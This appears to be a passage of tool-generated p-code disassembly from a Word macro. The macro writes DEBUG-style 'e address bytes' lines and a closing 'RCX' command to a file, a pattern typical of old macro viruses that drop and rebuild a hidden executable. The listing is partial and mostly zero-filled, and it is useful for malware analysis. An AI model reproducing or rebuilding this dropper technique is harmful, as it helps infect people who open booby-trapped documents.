' 	LitStr 0x0037 "e 1da0 6b 34 77 34 88 34 94 34 9e 34 a8 34 b5 34 c3 34 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #465:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1db0 d4 34 e0 34 f1 34 fb 34 04 35 10 35 1d 35 26 35 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #466:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1dc0 a7 35 b2 35 bd 35 c8 35 d3 35 de 35 e9 35 14 36 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #467:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1dd0 f4 35 1b 36 2a 36 32 36 43 36 54 36 6a 36 78 36 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #468:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1de0 80 36 89 36 97 36 9c 36 a9 36 b2 36 b8 36 c1 36 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #469:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1df0 ca 36 d0 36 dd 36 ea 36 f3 36 f9 36 0b 37 17 37 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #470:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e00 2d 37 32 37 48 37 4d 37 55 37 69 37 6e 37 76 37 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #471:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e10 8a 37 8f 37 97 37 ab 37 b0 37 b8 37 cc 37 e3 37 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #472:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e20 ec 37 fd 37 04 38 11 38 1a 38 20 38 28 38 2e 38 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #473:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e30 35 38 41 38 4f 38 58 38 64 38 6d 38 73 38 7c 38 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #474:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e40 88 38 91 38 97 38 a0 38 ad 38 b6 38 be 38 c9 38 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #475:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e50 6c 3b 74 3d 8a 3d a2 3d ba 3d d9 3d f8 3d 15 3e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #476:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e60 30 3e 00 00 00 20 00 00 14 00 00 00 14 30 19 30 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #477:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e70 61 30 67 30 6d 30 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #478:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #479:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #480:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ea0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #481:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #482:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ec0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #483:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ed0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #484:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ee0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #485:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #486:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #487:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #488:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #489:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #490:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #491:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #492:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #493:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #494:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #495:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #496:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1fa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #497:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1fb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #498:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1fc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #499:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1fd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #500:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1fe0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #501:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ff0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #502:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #503:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #504:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #505:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #506:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #507:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #508:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #509:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #510:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #511:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 2090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #512:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #513:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #514:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #515:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #516:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #517:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 20f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #518:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "RCX"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
